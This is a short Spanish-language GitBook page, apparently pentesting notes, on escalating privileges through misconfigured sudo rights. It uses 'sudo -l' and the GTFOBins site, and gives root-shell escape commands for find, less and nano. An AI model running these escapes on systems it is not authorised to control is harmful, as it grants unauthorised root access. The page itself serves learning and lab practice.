# Sudo

Si al realizar un

```bash
sudo -l
```

<figure><img src="../../.gitbook/assets/20231008020246.png" alt=""><figcaption></figcaption></figure>

Vemos que tenemos permiso de ejecutar varios binarios, una web la cual es muy util en estos casos de **gftobins**

{% embed url="https://gtfobins.github.io" %}

### **Explotación de binarios**

#### **find**

```shell
sudo find . -exec /bin/sh \; -quit
```

<figure><img src="../../.gitbook/assets/20231008020442.png" alt=""><figcaption></figcaption></figure>

**less**

```
sudo less /etc/profile
!/bin/sh
```

<figure><img src="../../.gitbook/assets/20231008021855.png" alt=""><figcaption></figcaption></figure>

**nano**

```shell
sudo nano
^R^X
reset; sh 1>&0 2>&0
```
